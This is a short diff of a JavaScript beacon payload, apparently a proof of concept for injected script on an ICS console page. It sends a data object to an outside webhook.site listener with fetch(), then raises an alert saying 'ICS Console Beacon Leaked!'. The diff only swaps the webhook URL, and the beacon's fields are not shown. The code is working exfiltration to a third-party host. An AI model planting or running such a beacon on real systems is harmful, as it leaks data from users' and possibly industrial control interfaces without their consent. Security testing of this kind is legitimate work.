@@ -7,7 +7,7 @@ const beacon = {
 };
 
 // Send data to your webhook listener
-fetch("https://webhook.site/9edb9b46-dd76-4b84-a93e-5aa8f0efbd1b?" + new URLSearchParams(beacon));
+fetch("https://webhook.site/0708085b-bf76-4caa-9a16-b0991ebd0c51?" + new URLSearchParams(beacon));
 
 // Optional: show a message to prove JS runs
 alert("⚠️ ICS Console Beacon Leaked!");
